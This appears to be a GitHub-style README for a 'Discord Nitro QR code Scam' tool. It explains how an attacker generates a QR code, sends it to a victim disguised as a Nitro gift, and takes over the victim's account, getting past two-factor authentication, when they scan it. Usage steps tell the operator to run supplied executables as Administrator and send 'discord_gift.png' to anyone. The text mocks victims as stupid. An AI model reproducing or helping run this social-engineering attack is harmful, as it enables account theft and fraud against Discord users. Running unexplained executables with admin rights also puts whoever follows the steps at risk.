# Discord Nitro QR code Scam
Discord Nitro QR Scam hacking Discord account and bypassing 2FA authentication.

## How it works
1. An hacker executes the `QR_Generator.py` file with Python
2. The hacker sends the QR code to a user and asks they to scan it with the Discord mobile app
3. The user scans the code (if the user is stupid lol) with the mobile account
4. The hacker gets access to the user's account

## How to use it
1. Open `pip_req_inst.exe` ad Administrator (reccommended)
2. Install Google Chrome opening the file `ChromeStableSetup.exe` (if you haven't done it in past)
3. Open `run_script.bat`
4. Send the file `discord_gift.png` to anyone
